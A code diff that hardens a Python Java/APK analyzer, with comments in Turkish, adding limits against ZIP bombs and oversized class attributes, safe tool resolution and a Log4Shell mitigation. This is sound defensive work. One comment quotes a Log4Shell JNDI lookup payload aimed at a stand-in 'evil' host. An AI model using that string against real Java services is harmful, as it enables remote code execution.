@@ -36,6 +36,7 @@ from karadul.analyzers.base import BaseAnalyzer
 from karadul.analyzers import register_analyzer
 from karadul.config import Config
 from karadul.core.result import StageResult
+from karadul.core.safe_subprocess import resolve_tool, safe_env, safe_run
 from karadul.core.target import TargetInfo, TargetType
 from karadul.core.workspace import Workspace
 
@@ -43,6 +44,35 @@ logger = logging.getLogger(__name__)
 
 # .class dosya sabitleri
 _CLASS_MAGIC = b"\xCA\xFE\xBA\xBE"
+
+# v1.10.0 Fix Sprint HIGH-2: ZIP bomb koruma sabitleri.
+# Tek bir entry uncompressed bu boyutu asarsa okuma reddedilir.
+_MAX_JAR_ENTRY_SIZE = 64 * 1024 * 1024  # 64MB (MANIFEST.MF / .class / AndroidManifest)
+# Toplam decompress guvenlik ust siniri (okunan tum entry'lerin toplami).
+_MAX_JAR_TOTAL_READ = 512 * 1024 * 1024  # 512MB
+
+# v1.10.0 Batch 5B HIGH-6: .class dosyasi attribute_length DoS koruma.
+# JVM spec u4 (4GB) izin veriyor ama gercekte <1MB; monkey-patch'lenebilir.
+# SecurityConfig.max_jar_attr_len_bytes ile tutarli (config override icin
+# JavaBinaryAnalyzer.__init__ self._max_attr_len kullanir; staticmethod
+# parse fn modul sabitini kullanir).
+_MAX_CLASS_ATTR_LEN = 10 * 1024 * 1024  # 10MB
+
+
+def _safe_zip_read(zf: "zipfile.ZipFile", name: str, max_size: int = _MAX_JAR_ENTRY_SIZE) -> bytes:
+    """ZipFile icinden entry oku, uncompressed_size onceden kontrol et.
+
+    v1.10.0 Fix Sprint HIGH-2: zf.read(name) ZIP bomb'a acik. Bu wrapper
+    getinfo().file_size ile uncompressed boyutu max_size ile karsilastirir
+    ve asilirsa ValueError atar.
+    """
+    info = zf.getinfo(name)
+    if info.file_size > max_size:
+        raise ValueError(
+            f"Guvenlik: ZIP entry {name!r} uncompressed {info.file_size} byte, "
+            f"limit {max_size} (ZIP bomb olabilir)"
+        )
+    return zf.read(name)
 
 # Constant pool tag degerleri (JVM Spec 4.4)
 _CP_UTF8 = 1
@@ -170,7 +200,11 @@ class JavaBinaryAnalyzer(BaseAnalyzer):
 
     def __init__(self, config: Config) -> None:
         super().__init__(config)
-        self._jadx_path = shutil.which("jadx")
+        # v1.10.0 Batch 5B CRITICAL-2: shutil.which -> resolve_tool ile
+        # PATH hijack koruma. Sadece whitelist dizinlerden jadx kabul edilir.
+        self._jadx_path = resolve_tool("jadx")
+        # v1.10.0 Batch 5B MED-7: max .class attribute_length (DoS koruma)
+        self._max_attr_len = config.security.max_jar_attr_len_bytes
 
     @staticmethod
     def can_handle(target_info: TargetInfo) -> bool:
@@ -441,7 +475,8 @@ class JavaBinaryAnalyzer(BaseAnalyzer):
             with zipfile.ZipFile(path) as zf:
                 # Java JAR: META-INF/MANIFEST.MF
                 if "META-INF/MANIFEST.MF" in zf.namelist():
-                    content = zf.read("META-INF/MANIFEST.MF").decode("utf-8", errors="replace")
+                    # v1.10.0 Fix Sprint HIGH-2: ZIP bomb koruma
+                    content = _safe_zip_read(zf, "META-INF/MANIFEST.MF").decode("utf-8", errors="replace")
                     for line in content.split("\n"):
                         if ":" in line:
                             key, _, value = line.partition(":")
@@ -452,7 +487,7 @@ class JavaBinaryAnalyzer(BaseAnalyzer):
                     manifest["is_android"] = True
                     # Binary XML'den package name cikarma
                     try:
-                        data = zf.read("AndroidManifest.xml")
+                        data = _safe_zip_read(zf, "AndroidManifest.xml")
                         # UTF-16 string'leri ara
                         strings = re.findall(rb"[\x20-\x7e]{4,}", data)
                         for s in strings:
@@ -515,7 +550,11 @@ class JavaBinaryAnalyzer(BaseAnalyzer):
                 "--output-dir", str(output_dir),
                 str(path),
             ]
-            proc = subprocess.run(
+            # v1.10.0 Batch 5B CRITICAL-1: Log4Shell (CVE-2021-44228) koruma.
+            # jadx kendisi Log4j2 <= 2.14 kullanabilir ve malicious APK icindeki
+            # ${jndi:ldap://evil/a} string'i cozumlenirse RCE olur.
+            # JAVA_TOOL_OPTIONS ile lookup'lar global olarak kapatilir.
+            proc = safe_run(
                 cmd,
                 capture_output=True,
                 text=True,
@@ -541,8 +580,10 @@ class JavaBinaryAnalyzer(BaseAnalyzer):
     def _extract_classes_from_strings(self, path: Path) -> list[str]:
         """jadx yoksa strings ile class isimlerini cikar."""
         try:
-            proc = subprocess.run(
-                ["strings", str(path)],
+            # v1.10.0 Batch 5B CRITICAL-2: resolve_tool + safe_env
+            strings_bin = resolve_tool("strings") or "strings"
+            proc = safe_run(
+                [strings_bin, str(path)],
                 capture_output=True, text=True, timeout=60,
             )
             if proc.returncode == 0:
@@ -771,6 +812,14 @@ class JavaBinaryAnalyzer(BaseAnalyzer):
                 if iface_name:
                     result["interfaces"].append(iface_name)
 
+            # v1.10.0 Batch 5B HIGH-6: attr_len DoS koruma.
+            # JVM .class spec'i u4 (max 4GB) izin veriyor ama normal .class
+            # dosyasinda attribute genellikle <1MB. Malicious .class 4GB
+            # istese memory explode olur -- `MAX_ATTR_LEN` ile kapat.
+            # staticmethod oldugu icin modul-seviyesi sabit kullaniyoruz; test/
+            # caller istege bagli `_MAX_CLASS_ATTR_LEN`'i monkey-patch edebilir.
+            max_attr_len = _MAX_CLASS_ATTR_LEN
+
             # Fields
             fields_count = struct.unpack(">H", r.read(2))[0]
             for _ in range(fields_count):
@@ -781,6 +830,12 @@ class JavaBinaryAnalyzer(BaseAnalyzer):
                 for _ in range(f_attr_count):
                     r.read(2)  # attr name idx
                     attr_len = struct.unpack(">I", r.read(4))[0]
+                    if attr_len > max_attr_len:
+                        logger.warning(
+                            ".class field attr_len %d > max %d -- malicious class?",
+                            attr_len, max_attr_len,
+                        )
+                        raise struct.error("attr_len DoS rejected")
                     r.read(attr_len)
                 field_name = resolve_utf8(f_name_idx)
                 field_desc = resolve_utf8(f_desc_idx)
@@ -800,6 +855,12 @@ class JavaBinaryAnalyzer(BaseAnalyzer):
                 for _ in range(m_attr_count):
                     r.read(2)
                     attr_len = struct.unpack(">I", r.read(4))[0]
+                    if attr_len > max_attr_len:
+                        logger.warning(
+                            ".class method attr_len %d > max %d -- malicious class?",
+                            attr_len, max_attr_len,
+                        )
+                        raise struct.error("attr_len DoS rejected")
                     r.read(attr_len)
                 method_name = resolve_utf8(m_name_idx)
                 method_desc = resolve_utf8(m_desc_idx)
@@ -836,13 +897,28 @@ class JavaBinaryAnalyzer(BaseAnalyzer):
                     import random
                     class_entries = random.sample(class_entries, max_classes)
 
+                # v1.10.0 Fix Sprint HIGH-2: ZIP bomb -- toplam decompress
+                # bytes takip et, _MAX_JAR_TOTAL_READ asilirsa kalan class'lari
+                # atlarken uyari logla (saldirgan her entry'i _MAX_JAR_ENTRY_SIZE
+                # tutsa bile 200 x 64MB = 12.8GB cikabilir).
+                total_read = 0
                 for entry_name in class_entries:
+                    if total_read > _MAX_JAR_TOTAL_READ:
+                        logger.warning(
+                            "JAR toplam decompress limiti asildi (%d byte), "
+                            "kalan class'lar atlaniyor", _MAX_JAR_TOTAL_READ,
+                        )
+                        break
                     try:
-                        data = zf.read(entry_name)
+                        data = _safe_zip_read(zf, entry_name)
+                        total_read += len(data)
                         if data[:4] == _CLASS_MAGIC:
                             info = self._parse_class_file(data)
                             info["source_entry"] = entry_name
                             results.append(info)
+                    except ValueError as exc:
+                        logger.warning("Java class atlandi (ZIP bomb koruma): %s -- %s", entry_name, exc)
+                        continue
                     except Exception:
                         logger.debug("Java class analizi basarisiz, atlaniyor", exc_info=True)
                         continue
